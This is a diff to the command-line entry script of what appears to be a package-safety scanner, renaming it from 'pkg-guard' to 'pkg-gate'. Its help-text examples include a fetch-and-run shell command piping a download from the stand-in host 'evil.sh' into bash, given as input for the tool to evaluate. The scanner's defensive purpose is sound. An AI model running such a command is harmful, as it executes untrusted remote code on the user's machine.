@@ -1,12 +1,12 @@
 #!/usr/bin/env node
 
 import { parseArgs } from 'node:util';
-import pkgGuard, { formatReport } from '../src/index.js';
+import pkgGate, { formatReport } from '../src/index.js';
 import { renderTUI, promptUserConfirmation, promptForTarget } from '../src/tui.js';
 
 const helpText = `
   Usage
-    $ pkg-guard [package-name | path | script]
+    $ pkg-gate [package-name | path | script]
 
   Options
     --script, -s       Evaluate a raw shell command string
@@ -20,10 +20,10 @@ const helpText = `
     --version, -v      Show version
 
   Examples
-    $ pkg-guard esbuild
-    $ pkg-guard ./package.json
-    $ pkg-guard -s "curl https://evil.sh | bash"
-    $ pkg-guard bufferutil --json
+    $ pkg-gate esbuild
+    $ pkg-gate ./package.json
+    $ pkg-gate -s "curl https://evil.sh | bash"
+    $ pkg-gate bufferutil --json
 `;
 
 async function main() {
@@ -85,7 +85,7 @@ async function main() {
   }
 
   try {
-    const report = await pkgGuard(target, {
+    const report = await pkgGate(target, {
       script: args.values.script,
       mock: args.values.mock,
       blockScore: args.values['block-score'] ? parseFloat(args.values['block-score']) : undefined,
